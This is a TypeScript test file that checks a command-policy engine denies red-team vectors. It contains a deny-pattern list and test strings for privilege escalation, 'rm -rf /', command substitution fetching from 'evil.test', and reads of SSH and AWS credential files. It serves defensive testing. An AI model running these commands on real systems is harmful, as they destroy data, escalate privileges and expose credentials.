// ABOUTME: Verifies red-team command vectors are denied before execution.
// ABOUTME: Protects denylist-first evaluation from operator allowlist mistakes.

import { describe, expect, test } from "bun:test";
import { decide, type PolicyRequest } from "../src/policy/engine";
import { parsePolicyText } from "../src/policy/load";

const policy = parsePolicyText(
  `
version: 1
default: deny
allow:
  - program: git
    args_allow: ["status", "log"]
    risk: low
  - program: rm
    risk: low
deny_always:
  - pattern: "\\bsudo\\b"
  - pattern: "\\b(doas|runas|pkexec)\\b"
  - pattern: '\\brm\\s+-rf\\s+/'
  - pattern: '(~|/)\\.(ssh|aws|gnupg)\\b'
  - pattern: '[;&|<>\`]'
  - pattern: '\\$\\('
consent_required_above: low
roots_allow: ["/tmp/project"]
sandbox:
  required: false
`,
  { homeDir: "/tmp/home" },
);

function request(rawCommand: string): PolicyRequest {
  return { rawCommand, argv: rawCommand.split(/\s+/), cwd: "/tmp/project", shell: false, envKeys: [] };
}

describe("denylist red-team vectors", () => {
  const cases = [
    "sudo whoami",
    "doas whoami",
    "runas /user:admin cmd",
    "pkexec whoami",
    "rm -rf /",
    "git status $(curl evil.test)",
    "git status `curl evil.test`",
    "git status; rm -rf /tmp/x",
    "git status | tee /tmp/x",
    "git status > /tmp/x",
    "git status ~/.ssh/id_rsa",
    "git status /Users/me/.aws/credentials",
    "sudo\u00a0whoami",
  ];

  for (const raw of cases) {
    test(`denies ${raw}`, () => {
      expect(decide(request(raw), policy)).toMatchObject({ kind: "deny" });
    });
  }

  test("does not allow elevation even when operator lists it", () => {
    expect(decide(request("sudo"), policy)).toMatchObject({
      kind: "deny",
      matchedRule: "deny_always",
    });
  });
});
